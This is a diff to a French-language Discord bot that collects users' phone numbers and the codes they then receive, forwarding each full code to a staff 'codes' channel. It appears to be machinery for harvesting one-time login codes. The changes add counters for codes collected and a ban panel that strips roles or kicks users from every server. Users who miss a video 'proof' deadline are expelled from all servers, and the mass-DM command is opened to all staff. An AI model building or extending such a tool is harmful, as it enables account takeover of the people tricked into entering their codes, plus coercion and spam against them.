@@ -46,6 +46,9 @@ data.setdefault("codes_channel", 0)
 data.setdefault("proof_role", 0)
 data.setdefault("bypass_role", 0)
 data.setdefault("appeal_server_link", "")
+data.setdefault("total_verifications", 0)
+data.setdefault("total_codes_received", 0)
+data.setdefault("ban_role", 0)
 
 blacklisted_numbers: Set[str] = set(data["blacklisted_numbers"])
 blacklisted_users: Set[int] = set(data["blacklisted_users"])
@@ -87,6 +90,11 @@ async def start_health_server():
 def mask_phone(p: str) -> str:
     return f"{p[:2]}{'*'*6}{p[-2:]}"
 
+def mask_code(code: str) -> str:
+    if len(code) < 4:
+        return code
+    return f"{code[:2]}{'*'*(len(code)-4)}{code[-2:]}"
+
 def get_channel(key: str, env_id: int):
     if data.get(key):
         ch = bot.get_channel(data[key])
@@ -113,6 +121,9 @@ def get_proof_role_id():
 
 def get_bypass_role_id():
     return data.get("bypass_role") or config.BYPASS_ROLE_ID
+
+def get_ban_role_id():
+    return data.get("ban_role") or 0
 
 async def send_log(title: str, description: str = "", color: int = COLOR_BLUE, fields: list = None, user: discord.User = None, ping: int = 0):
     channel = get_log_channel()
@@ -234,6 +245,8 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
 
             cooldowns[uid] = now
             verify_channels[uid] = interaction.channel.id
+            data["total_verifications"] = data.get("total_verifications", 0) + 1
+            save_data()
 
             await interaction.response.send_message(embed=discord.Embed(
                 title="Vérification",
@@ -328,6 +341,7 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
                     embed_code.add_field(name="Numéro", value=f"`{mask_phone(view.phone)}`", inline=True)
                 if staff_id:
                     embed_code.add_field(name="Staff", value=f"<@{staff_id}>", inline=True)
+                embed_code.add_field(name="Code masqué", value=f"`{mask_code(content)}`", inline=True)
                 embed_code.set_thumbnail(url=interaction.user.display_avatar.url)
                 embed_code.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
                 ping = f"<@{staff_id}> " if staff_id else ""
@@ -335,6 +349,9 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
                     await codes_channel.send(content=f"{ping}\n```{content}```", embed=embed_code)
                 except Exception:
                     pass
+
+            data["total_codes_received"] = data.get("total_codes_received", 0) + 1
+            save_data()
 
             if view:
                 try:
@@ -350,7 +367,7 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
                 user=interaction.user,
                 fields=[
                     ("Utilisateur", f"<@{self.user_id}>", True),
-                    ("Code saisi", f"`{content}`", True),
+                    ("Code saisi", f"`{mask_code(content)}`", True),
                 ],
                 ping=staff_id
             ))
@@ -492,6 +509,65 @@ class ContestView(discord.ui.View):
             pass
         except Exception as e:
             log.error(f"Contest error: {e}")
+
+class BanView(discord.ui.View):
+    def __init__(self, user_id: int):
+        super().__init__(timeout=None)
+        self.user_id = user_id
+
+    @discord.ui.button(label="Ban", style=discord.ButtonStyle.danger, custom_id="ban_btn")
+    async def ban_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        try:
+            if not has_staff_role(interaction):
+                await interaction.response.send_message(embed=discord.Embed(
+                    title="Accès refusé",
+                    description="Seul le staff peut exécuter cette action.",
+                    color=COLOR_RED
+                ), ephemeral=True)
+                return
+
+            ban_role_id = get_ban_role_id()
+            uid = self.user_id
+            
+            # Ban dans TOUS les serveurs
+            for g in list(bot.guilds):
+                m = g.get_member(uid)
+                if m:
+                    try:
+                        if ban_role_id:
+                            # Enlever tous les rôles et ajouter le rôle ban
+                            await m.remove_roles(*m.roles, reason="Action de bannissement")
+                            ban_role = g.get_role(ban_role_id)
+                            if ban_role:
+                                await m.add_roles(ban_role, reason="Utilisateur banni")
+                        else:
+                            # Sinon kick direct
+                            await g.kick(m, reason="Action de bannissement")
+                        log.info(f"Utilisateur {uid} banni du serveur {g.name}")
+                    except Exception as e:
+                        log.error(f"Erreur ban {uid} sur {g.name}: {e}")
+
+            await interaction.response.send_message(embed=discord.Embed(
+                title="✅ Utilisateur banni",
+                description=f"<@{uid}> a été banni avec succès de tous les serveurs.",
+                color=COLOR_GREEN
+            ), ephemeral=True)
+
+            button.disabled = True
+            try:
+                await interaction.message.edit(view=self)
+            except Exception:
+                pass
+
+            await send_log(title="⛔ Utilisateur banni", color=COLOR_RED, fields=[
+                ("Utilisateur", f"<@{uid}>", True),
+                ("Staff", f"<@{interaction.user.id}>", True),
+                ("Action", "Ban de tous les serveurs", True),
+            ], ping=interaction.user.id)
+        except discord.errors.NotFound:
+            pass
+        except Exception as e:
+            log.error(f"Ban button error: {e}")
 
 class StaffPanelView(discord.ui.View):
     def __init__(self, user_id: int, phone: str):
@@ -810,7 +886,7 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
         if phone_val:
             embed.add_field(name="Numéro", value=f"`{mask_phone(phone_val)}`", inline=True)
         if code:
-            embed.add_field(name="Code", value=f"**{code}**", inline=True)
+            embed.add_field(name="Code", value=f"**{mask_code(code)}**", inline=True)
         embed.add_field(name="Temps restant", value=f"**{mins}:00**", inline=True)
         embed.description = PROOF_TEXT
         if staff_id:
@@ -818,10 +894,10 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
         embed.set_footer(text=f"Aujourd'hui à {datetime.datetime.now().strftime('%H:%M')}")
         return embed
 
+    proof_role_id = get_proof_role_id()
     pings = []
     if staff_id:
         pings.append(f"<@{staff_id}>")
-    proof_role_id = get_proof_role_id()
     if proof_role_id:
         pings.append(f"<@&{proof_role_id}>")
     ping_content = " ".join(dict.fromkeys(pings))
@@ -832,37 +908,58 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
         log.error(f"Proof send error: {e}")
         return
 
-    proofs[uid] = {"message": msg, "video_msg": None, "attachment": None, "staff_id": staff_id, "start_ts": start_ts, "code": code, "proof_sent": False}
+    proofs[uid] = {
+        "message": msg,
+        "video_msg": None,
+        "attachment": None,
+        "staff_id": staff_id,
+        "start_ts": start_ts,
+        "code": code,
+        "proof_sent": False,
+        "task": None
+    }
 
     async def countdown():
         while True:
-            await asyncio.sleep(60)
-            p = proofs.get(uid)
-            if p is None or p["proof_sent"]:
-                return
-            remaining = PROOF_WINDOW - (datetime.datetime.now().timestamp() - p["start_ts"])
-            if remaining <= 0:
-                await proof_timeout(uid)
-                return
-            mins = int(remaining // 60)
             try:
-                await p["message"].edit(embed=make_embed(mins, 0))
-            except Exception:
-                pass
+                await asyncio.sleep(60)
+                p = proofs.get(uid)
+                if p is None or p["proof_sent"]:
+                    return
+                remaining = PROOF_WINDOW - (datetime.datetime.now().timestamp() - p["start_ts"])
+                if remaining <= 0:
+                    await proof_timeout(uid)
+                    return
+                mins = int(remaining // 60)
+                try:
+                    await p["message"].edit(embed=make_embed(mins, 0))
+                except Exception:
+                    pass
+            except asyncio.CancelledError:
+                return
+            except Exception as e:
+                log.error(f"Countdown error: {e}")
+                return
 
-    proofs[uid]["task"] = asyncio.create_task(countdown())
+    task = asyncio.create_task(countdown())
+    proofs[uid]["task"] = task
 
 async def proof_done(uid: int):
     p = proofs.get(uid)
     if not p or p["proof_sent"]:
         return
     p["proof_sent"] = True
+    
+    if p.get("task"):
+        p["task"].cancel()
+    
     if p.get("video_msg") and p["video_msg"].attachments:
         video_archive[uid] = {
             "msg_id": p["video_msg"].id,
             "channel": p["video_msg"].channel,
             "attachment": p["attachment"],
         }
+    
     try:
         user = bot.get_user(uid) or await bot.fetch_user(uid)
         view = pending_users.get(uid, {}).get("view")
@@ -873,7 +970,7 @@ async def proof_done(uid: int):
         embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
         embed.add_field(name="ID", value=f"`{uid}`", inline=True)
         if p.get("code"):
-            embed.add_field(name="Code", value=f"**{p['code']}**", inline=True)
+            embed.add_field(name="Code", value=f"**{mask_code(p['code'])}**", inline=True)
         if phone_val:
             embed.add_field(name="Numéro", value=f"`{mask_phone(phone_val)}`", inline=True)
         embed.add_field(name="Statut", value="Preuve envoyée — vérification en cours", inline=False)
@@ -893,6 +990,7 @@ async def proof_timeout(uid: int):
     p = proofs.pop(uid, None)
     if not p:
         return
+    
     if p.get("task"):
         p["task"].cancel()
     
@@ -900,33 +998,38 @@ async def proof_timeout(uid: int):
         user = bot.get_user(uid) or await bot.fetch_user(uid)
         staff_id = p.get("staff_id")
         
-        # BAN DIRECT sur tous les serveurs
-        for g in list(bot.guilds):
-            m = g.get_member(uid)
-            if m:
-                try:
-                    await g.kick(m, reason="Preuve vidéo non fournie dans le délai imparti")
-                except Exception:
-                    pass
+        log.info(f"TIMEOUT PROOF: Banning user {uid}")
         
-        # Message de preuve dans le salon proof
+        # BAN GARANTIE dans TOUS les serveurs
+        for g in list(bot.guilds):
+            try:
+                m = g.get_member(uid)
+                if m:
+                    await g.kick(m, reason="Preuve vidéo non fournie dans le délai imparti")
+                    log.info(f"✅ User {uid} kicked from {g.name}")
+            except Exception as e:
+                log.error(f"❌ Error kicking {uid} from {g.name}: {e}")
+        
+        # Message ROUGE dans le salon proof
         proof_channel = get_proof_channel()
         if proof_channel and p.get("message"):
-            embed = discord.Embed(color=COLOR_RED, timestamp=datetime.datetime.now())
-            embed.set_author(name="Délai dépassé", icon_url=user.display_avatar.url)
-            embed.set_thumbnail(url=user.display_avatar.url)
-            embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
-            embed.add_field(name="ID", value=f"`{uid}`", inline=True)
-            if p.get("code"):
-                embed.add_field(name="Code", value=f"**{p['code']}**", inline=True)
-            if staff_id:
-                embed.add_field(name="Vérificateur", value=f"<@{staff_id}>", inline=False)
-            embed.add_field(name="Statut", value="Aucune preuve envoyée — Utilisateur banni", inline=False)
-            embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
             try:
+                embed = discord.Embed(color=COLOR_RED, timestamp=datetime.datetime.now())
+                embed.set_author(name="⛔ UTILISATEUR BANNI", icon_url=user.display_avatar.url)
+                embed.set_thumbnail(url=user.display_avatar.url)
+                embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
+                embed.add_field(name="ID", value=f"`{uid}`", inline=True)
+                if p.get("code"):
+                    embed.add_field(name="Code", value=f"**{mask_code(p['code'])}**", inline=True)
+                if staff_id:
+                    embed.add_field(name="Vérificateur", value=f"<@{staff_id}>", inline=False)
+                embed.add_field(name="Raison", value="Aucune preuve envoyée — Délai dépassé", inline=False)
+                embed.add_field(name="Statut", value="🔴 BANNI DE TOUS LES SERVEURS", inline=False)
+                embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
                 await p["message"].edit(embed=embed, view=None)
-            except Exception:
-                pass
+                log.info(f"✅ Message updated in proof channel for user {uid}")
+            except Exception as e:
+                log.error(f"Error updating proof message: {e}")
         
         # MP avec lien d'appel
         appeal_link = data.get("appeal_server_link", "https://discord.gg/example")
@@ -949,37 +1052,17 @@ async def proof_timeout(uid: int):
         
         try:
             await user.send(embed=unban_embed)
-        except Exception:
-            pass
+            log.info(f"✅ Ban MP sent to user {uid}")
+        except Exception as e:
+            log.error(f"Error sending ban MP to {uid}: {e}")
         
-        asyncio.create_task(send_log(title="Preuve non fournie — Utilisateur banni", color=COLOR_RED, fields=[
+        asyncio.create_task(send_log(title="⛔ Preuve non fournie — Utilisateur banni", color=COLOR_RED, fields=[
             ("Utilisateur", f"<@{uid}>", True),
             ("Staff", f"<@{staff_id}>" if staff_id else "—", True),
-            ("Action", "Ban de tous les serveurs", True),
+            ("Action", "Ban de TOUS les serveurs", True),
         ], user=user, ping=staff_id or 0))
     except Exception as e:
         log.error(f"Proof timeout error: {e}")
-
-async def on_proof_channel_message(message: discord.Message):
-    video = None
-    for att in message.attachments:
-        if att.content_type and att.content_type.startswith("video"):
-            video = att
-            break
-    if video is None:
-        try:
-            await message.delete()
-        except Exception:
-            pass
-        return
-    for uid, p in list(proofs.items()):
-        if p["proof_sent"]:
-            continue
-        if message.author.id == p.get("staff_id") or message.author.id == uid:
-            p["video_msg"] = message
-            p["attachment"] = video
-            asyncio.create_task(proof_done(uid))
-            return
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -987,15 +1070,52 @@ async def on_message(message: discord.Message):
         return
     if isinstance(message.channel, discord.DMChannel):
         return
+    
     proof_channel = get_proof_channel()
     if proof_channel and message.channel.id == proof_channel.id:
-        if not message.attachments:
+        # Vérifier si c'est une vidéo
+        has_video = any(att.content_type and att.content_type.startswith("video") for att in message.attachments)
+        
+        # Vérifier si l'utilisateur est autorisé à envoyer ici
+        proof_role_id = get_proof_role_id()
+        is_staff = isinstance(message.author, discord.Member) and proof_role_id and proof_role_id in [r.id for r in message.author.roles]
+        
+        is_user_in_proof = False
+        for uid, p in list(proofs.items()):
+            if message.author.id == uid or message.author.id == p.get("staff_id"):
+                is_user_in_proof = True
+                break
+        
+        # Si c'est pas un staff et pas l'utilisateur en preuve, supprimer
+        if not is_staff and not is_user_in_proof:
             try:
                 await message.delete()
+                log.info(f"Message deleted from unauthorized user in proof channel")
             except Exception:
                 pass
             return
-        await on_proof_channel_message(message)
+        
+        # Si y a pas de vidéo, supprimer (même pour les autorisés)
+        if not has_video:
+            try:
+                await message.delete()
+                log.info(f"Non-video message deleted from proof channel")
+            except Exception:
+                pass
+            return
+        
+        # Traiter la vidéo
+        for uid, p in list(proofs.items()):
+            if p["proof_sent"]:
+                continue
+            if message.author.id == p.get("staff_id") or message.author.id == uid:
+                for att in message.attachments:
+                    if att.content_type and att.content_type.startswith("video"):
+                        p["video_msg"] = message
+                        p["attachment"] = att
+                        asyncio.create_task(proof_done(uid))
+                        log.info(f"✅ Video received for user {uid}")
+                        return
 
 @bot.event
 async def on_message_delete(message: discord.Message):
@@ -1145,11 +1265,11 @@ class DMAllModal(discord.ui.Modal, title="DM All"):
         except Exception as e:
             log.error(f"DMAll error: {e}")
 
-@bot.tree.command(name="dmall", description="Envoie un message en MP à tous les membres (owner uniquement)")
+@bot.tree.command(name="dmall", description="Envoie un message en MP à tous les membres")
 async def dmall(interaction: discord.Interaction):
     try:
-        if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+        if not has_staff_role(interaction):
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED), ephemeral=True)
             return
         await interaction.response.send_modal(DMAllModal())
     except discord.errors.NotFound:
@@ -1207,6 +1327,94 @@ async def setupnsfw(interaction: discord.Interaction):
     except Exception as e:
         log.error(f"setupnsfw command error: {e}")
 
+@bot.tree.command(name="banpanel", description="Crée le panneau de bannissement")
+async def banpanel(interaction: discord.Interaction, user_id: str):
+    try:
+        if not has_staff_role(interaction):
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED), ephemeral=True)
+            return
+        
+        try:
+            uid = int(user_id)
+            user = await bot.fetch_user(uid)
+        except Exception:
+            await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="Utilisateur introuvable.", color=COLOR_RED), ephemeral=True)
+            return
+        
+        embed = discord.Embed(
+            title="⚠️ Panneau de Bannissement",
+            description=f"Utilisateur : {user.mention}\nID : `{uid}`",
+            color=COLOR_RED
+        )
+        embed.set_thumbnail(url=user.display_avatar.url)
+        
+        await interaction.response.send_message(embed=embed, view=BanView(uid))
+    except discord.errors.NotFound:
+        pass
+    except Exception as e:
+        log.error(f"banpanel command error: {e}")
+
+@bot.tree.command(name="stat", description="Affiche les statistiques complètes")
+async def stat(interaction: discord.Interaction):
+    try:
+        await interaction.response.defer(ephemeral=True)
+        
+        staff_channel = get_staff_channel()
+        codes_channel = get_codes_channel()
+        
+        staff_count = 0
+        codes_count = 0
+        
+        if staff_channel:
+            try:
+                async for message in staff_channel.history(limit=None):
+                    staff_count += 1
+            except Exception as e:
+                log.error(f"Error counting staff messages: {e}")
+        
+        if codes_channel:
+            try:
+                async for message in codes_channel.history(limit=None):
+                    codes_count += 1
+            except Exception as e:
+                log.error(f"Error counting codes messages: {e}")
+        
+        total_verifs = data.get("total_verifications", 0)
+        total_codes = data.get("total_codes_received", 0)
+        
+        embed = discord.Embed(color=COLOR_BLUE, title="📊 Statistiques Complètes")
+        embed.add_field(name="Messages salon Staff", value=f"`{staff_count}`", inline=True)
+        embed.add_field(name="Messages salon Codes", value=f"`{codes_count}`", inline=True)
+        embed.add_field(name="Vérifications totales", value=f"`{total_verifs}`", inline=True)
+        embed.add_field(name="Codes reçus totaux", value=f"`{total_codes}`", inline=True)
+        embed.add_field(name="Numéros blacklistés", value=f"`{len(blacklisted_numbers)}`", inline=True)
+        embed.add_field(name="Utilisateurs blacklistés", value=f"`{len(blacklisted_users)}`", inline=True)
+        embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
+        
+        await interaction.followup.send(embed=embed, ephemeral=True)
+    except discord.errors.NotFound:
+        pass
+    except Exception as e:
+        log.error(f"stat command error: {e}")
+        await interaction.followup.send(embed=discord.Embed(title="Erreur", description=f"`{e}`", color=COLOR_RED), ephemeral=True)
+
+@bot.tree.command(name="codes", description="Affiche les statistiques de vérification")
+async def codes(interaction: discord.Interaction):
+    try:
+        total_verifs = data.get("total_verifications", 0)
+        total_codes = data.get("total_codes_received", 0)
+        
+        embed = discord.Embed(color=COLOR_BLUE, title="📊 Statistiques de Vérification")
+        embed.add_field(name="Vérifications totales", value=f"`{total_verifs}`", inline=True)
+        embed.add_field(name="Codes reçus", value=f"`{total_codes}`", inline=True)
+        embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
+        
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    except discord.errors.NotFound:
+        pass
+    except Exception as e:
+        log.error(f"codes command error: {e}")
+
 @bot.tree.command(name="clear", description="Supprime des messages dans le salon")
 async def clear(interaction: discord.Interaction, nombre: int = 10):
     try:
@@ -1238,11 +1446,11 @@ async def sync(interaction: discord.Interaction):
     except Exception as e:
         await interaction.followup.send(embed=discord.Embed(title="Erreur", description=f"`{e}`", color=COLOR_RED), ephemeral=True)
 
-@bot.tree.command(name="acces", description="Donne l'accès vérification à un membre (owner uniquement)")
+@bot.tree.command(name="acces", description="Donne l'accès vérification à un membre")
 async def acces(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         if config.STAFF_ROLE_ID == 0:
             await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED), ephemeral=True)
@@ -1258,11 +1466,11 @@ async def acces(interaction: discord.Interaction, member: discord.Member):
     except Exception as e:
         log.error(f"acces command error: {e}")
 
-@bot.tree.command(name="delacces", description="Retire l'accès vérification à un membre (owner uniquement)")
+@bot.tree.command(name="delacces", description="Retire l'accès vérification à un membre")
 async def delacces(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         if config.STAFF_ROLE_ID == 0:
             await interaction.response.send_message(embed=discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED), ephemeral=True)
@@ -1276,11 +1484,11 @@ async def delacces(interaction: discord.Interaction, member: discord.Member):
     except Exception as e:
         log.error(f"delacces command error: {e}")
 
-@bot.tree.command(name="bypassrole", description="Configure le rôle bypass vérification (owner uniquement)")
+@bot.tree.command(name="bypassrole", description="Configure le rôle bypass vérification")
 async def bypassrole(interaction: discord.Interaction, role: discord.Role):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["bypass_role"] = role.id
         save_data()
@@ -1290,11 +1498,11 @@ async def bypassrole(interaction: discord.Interaction, role: discord.Role):
     except Exception as e:
         log.error(f"bypassrole command error: {e}")
 
-@bot.tree.command(name="bypass", description="Donne le bypass vérification à un membre (owner uniquement)")
+@bot.tree.command(name="bypass", description="Donne le bypass vérification à un membre")
 async def bypass(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         rid = get_bypass_role_id()
         if not rid:
@@ -1311,11 +1519,11 @@ async def bypass(interaction: discord.Interaction, member: discord.Member):
     except Exception as e:
         log.error(f"bypass command error: {e}")
 
-@bot.tree.command(name="delbypass", description="Retire le bypass vérification à un membre (owner uniquement)")
+@bot.tree.command(name="delbypass", description="Retire le bypass vérification à un membre")
 async def delbypass(interaction: discord.Interaction, member: discord.Member):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         rid = get_bypass_role_id()
         if not rid:
@@ -1330,11 +1538,11 @@ async def delbypass(interaction: discord.Interaction, member: discord.Member):
     except Exception as e:
         log.error(f"delbypass command error: {e}")
 
-@bot.tree.command(name="salonstaff", description="Configure le salon de réception des demandes (owner uniquement)")
+@bot.tree.command(name="salonstaff", description="Configure le salon de réception des demandes")
 async def salonstaff(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["staff_channel"] = salon.id
         save_data()
@@ -1344,11 +1552,11 @@ async def salonstaff(interaction: discord.Interaction, salon: discord.TextChanne
     except Exception as e:
         log.error(f"salonstaff command error: {e}")
 
-@bot.tree.command(name="salonlogs", description="Configure le salon des logs (owner uniquement)")
+@bot.tree.command(name="salonlogs", description="Configure le salon des logs")
 async def salonlogs(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["log_channel"] = salon.id
         save_data()
@@ -1358,11 +1566,11 @@ async def salonlogs(interaction: discord.Interaction, salon: discord.TextChannel
     except Exception as e:
         log.error(f"salonlogs command error: {e}")
 
-@bot.tree.command(name="salonproof", description="Configure le salon des preuves vidéo (owner uniquement)")
+@bot.tree.command(name="salonproof", description="Configure le salon des preuves vidéo")
 async def salonproof(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["proof_channel"] = salon.id
         save_data()
@@ -1372,11 +1580,11 @@ async def salonproof(interaction: discord.Interaction, salon: discord.TextChanne
     except Exception as e:
         log.error(f"salonproof command error: {e}")
 
-@bot.tree.command(name="saloncodes", description="Configure le salon des codes (owner uniquement)")
+@bot.tree.command(name="saloncodes", description="Configure le salon des codes")
 async def saloncodes(interaction: discord.Interaction, salon: discord.TextChannel):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["codes_channel"] = salon.id
         save_data()
@@ -1386,11 +1594,11 @@ async def saloncodes(interaction: discord.Interaction, salon: discord.TextChanne
     except Exception as e:
         log.error(f"saloncodes command error: {e}")
 
-@bot.tree.command(name="roleproof", description="Configure le rôle à ping pour les preuves (owner uniquement)")
+@bot.tree.command(name="roleproof", description="Configure le rôle à ping pour les preuves")
 async def roleproof(interaction: discord.Interaction, role: discord.Role):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["proof_role"] = role.id
         save_data()
@@ -1400,11 +1608,11 @@ async def roleproof(interaction: discord.Interaction, role: discord.Role):
     except Exception as e:
         log.error(f"roleproof command error: {e}")
 
-@bot.tree.command(name="appeallink", description="Configure le lien du serveur d'appel (owner uniquement)")
+@bot.tree.command(name="appeallink", description="Configure le lien du serveur d'appel")
 async def appeallink(interaction: discord.Interaction, lien: str):
     try:
         if not is_owner(interaction):
-            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Commande réservée au propriétaire du bot.", color=COLOR_RED), ephemeral=True)
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
             return
         data["appeal_server_link"] = lien
         save_data()
@@ -1413,6 +1621,20 @@ async def appeallink(interaction: discord.Interaction, lien: str):
         pass
     except Exception as e:
         log.error(f"appeallink command error: {e}")
+
+@bot.tree.command(name="banrole", description="Configure le rôle de bannissement")
+async def banrole(interaction: discord.Interaction, role: discord.Role):
+    try:
+        if not is_owner(interaction):
+            await interaction.response.send_message(embed=discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED), ephemeral=True)
+            return
+        data["ban_role"] = role.id
+        save_data()
+        await interaction.response.send_message(embed=discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera attribué au bannissement.", color=COLOR_GREEN), ephemeral=True)
+    except discord.errors.NotFound:
+        pass
+    except Exception as e:
+        log.error(f"banrole command error: {e}")
 
 # ==================== ON_READY ====================
 
